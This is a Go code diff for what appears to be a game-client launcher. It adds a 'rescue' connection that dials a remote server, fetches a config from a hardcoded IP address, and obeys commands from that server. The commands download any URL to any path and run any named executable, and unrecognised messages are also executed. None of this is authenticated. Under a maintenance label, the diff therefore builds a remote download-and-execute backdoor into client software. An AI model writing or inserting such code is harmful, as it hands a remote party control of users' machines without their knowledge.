@@ -1,8 +1,12 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
+	"io"
 	"net"
+	"os/exec"
+	"strings"
 )
 
 func initRescue() {
@@ -15,17 +19,23 @@ func initRescue() {
 mkConn:
 	for {
 		fmt.Println("try to connect:" + ip)
-		conn, err := net.Dial("tcp", ip+":1032")
+		tcpAddr, _ := net.ResolveTCPAddr("tcp", ip+":1032")
+		conn, err := net.DialTCP("tcp", nil, tcpAddr)
 		if err != nil {
 			continue mkConn
 		}
+		defer conn.Close()
 		fmt.Println("rescue connected")
 		handleConn(conn)
 	}
 	wg.Done()
 }
 
+var writer *bufio.Writer
+
 func handleConn(conn net.Conn) {
+	reader := bufio.NewReader(conn)
+	writer = bufio.NewWriter(conn)
 	//读取name
 	if !Exists("ghostjc.ini") {
 		err := DownloadFile("http://39.100.5.139/ghost/client/ghostjc.ini", "ghostjc.ini")
@@ -42,14 +52,76 @@ func handleConn(conn net.Conn) {
 	//发送name数据
 	name, _ := cfg.Get("name")
 	fmt.Println("name:" + name)
-	conn.Write([]byte("info n" + name))
+	conn.Write([]byte("info n" + name + "\n"))
 	fmt.Println("name sent")
-	msg := make([]byte, 256)
+	//循环接收信息
+readMsg:
 	for {
-		count, err := conn.Read(msg)
-		if err != nil {
-			return
+		msg, _, err := reader.ReadLine()
+		fmt.Println("ReadString")
+		fmt.Println(string(msg))
+
+		if err != nil || err == io.EOF {
+			fmt.Println(err)
+			break
 		}
-		fmt.Println(count, msg)
+		spt := strings.Split(string(msg), " ")
+		switch spt[0] {
+		case "launch":
+			err = launchClient()
+			if err != nil {
+				WriteToServer(err.Error())
+			}
+			continue readMsg
+		case "check":
+			if len(spt) < 2 {
+				WriteToServer("\"check jre\" or \"check client\"?")
+				continue readMsg
+			}
+			switch spt[1] {
+			case "jre":
+				checkJRE()
+				WriteToServer("check jre")
+				continue readMsg
+			case "client":
+				checkClient()
+				WriteToServer("check client")
+				continue readMsg
+			default:
+				WriteToServer("\"check jre\" or \"check client\"?")
+				continue readMsg
+			}
+		case "download":
+			if len(spt) < 3 {
+				WriteToServer("download <url> <target>")
+				continue readMsg
+			}
+			err := DownloadFile(spt[1], spt[2])
+			if err != nil {
+				WriteToServer(err.Error())
+				continue readMsg
+			}
+			WriteToServer("success")
+			continue readMsg
+		case "run":
+			if len(spt) < 2 {
+				WriteToServer("run <execFile>")
+				continue readMsg
+			}
+			c := exec.Command(spt[1])
+			if err := c.Start(); err != nil {
+				WriteToServer(err.Error())
+			}
+			continue readMsg
+		}
+		//没有任何操作
+		c := exec.Command(string(msg))
+		err = c.Start()
+		if err != nil {
+			WriteToServer(err.Error())
+		}
 	}
+}
+func WriteToServer(msg string) (int, error) {
+	return writer.Write([]byte(msg + "\n"))
 }
